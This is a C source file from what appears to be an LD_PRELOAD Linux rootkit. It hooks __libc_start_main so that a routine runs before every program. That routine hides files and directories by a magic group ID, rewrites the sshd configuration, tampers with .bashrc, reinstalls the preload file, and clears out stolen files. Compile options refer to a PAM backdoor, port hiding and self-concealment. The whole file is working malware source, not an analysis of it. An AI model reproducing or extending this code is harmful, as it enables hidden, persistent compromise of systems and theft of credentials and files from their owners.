#define _GNU_SOURCE

#include "config.h"
#include "sanity.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fnmatch.h>
#include <dirent.h>
#include <time.h>
#include <libgen.h>
#include <dlfcn.h>
#include <link.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>

#ifdef HIDE_SELF
#include <utime.h>
#include <sys/time.h>
#endif

#ifdef HIDE_PORTS
#include <linux/netlink.h>
#include <pcap/pcap.h>
#endif

#include <pwd.h>
#include <shadow.h>

#ifdef USE_PAM_BD
#include <utmp.h>
#include <utmpx.h>
#endif

#if defined USE_PAM_BD || defined LOG_LOCAL_AUTH
#include <security/pam_ext.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <syslog.h>
#endif

#define LINE_MAX 2048

typedef struct {
    void *(*func)();
} syms;

#define sizeofarr(arr) sizeof(arr) / sizeof(arr[0])

void plsdomefirst(void);
#include "includes.h"

void plsdomefirst(void){
    if(not_user(0) || rknomore())
        return;

#ifdef READ_GID_FROM_FILE
    hook(CACCESS,CFOPEN,CFWRITE,CCHMOD);
    if((long)call(CACCESS, GID_PATH, F_OK) != 0){
        FILE *fp = call(CFOPEN, GID_PATH, "w");
        if(fp != NULL){
            char buf[12];
            snprintf(buf, 12, "%d", MAGIC_GID);
            call(CFWRITE, buf, 1, strlen(buf), fp);
            fclose(fp);
            call(CCHMOD, GID_PATH, 0666);
        }
    }
#endif
    gid_t magicgid = readgid();
    preparedir(HOMEDIR, magicgid);
    hidedircontents(HOMEDIR, magicgid);
    hidedircontents(INSTALL_DIR, magicgid);
#if defined FILE_CLEANSE_TIMER && defined FILE_STEAL
    cleanstolen();
#endif
#ifdef ROOTKIT_BASHRC
    checkbashrc();
#endif
#ifdef CLEANSE_HOMEDIR
    bdvcleanse();
#endif
#if defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
    gidchanger();
#endif
#ifdef ALWAYS_REINSTALL
#ifdef PATCH_DYNAMIC_LINKER
    reinstall(PRELOAD_FILE);
#else
    reinstall(OLD_PRELOAD);
#endif
#endif
#ifdef HARD_PATCH_SSHD_CONFIG
    sshdpatch();
#endif
}


int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
    plsdomefirst();
    hook(C__LIBC_START_MAIN);
    return (long)call(C__LIBC_START_MAIN, main, argc, ubp_av, init, fini, rtld_fini, stack_end);
}
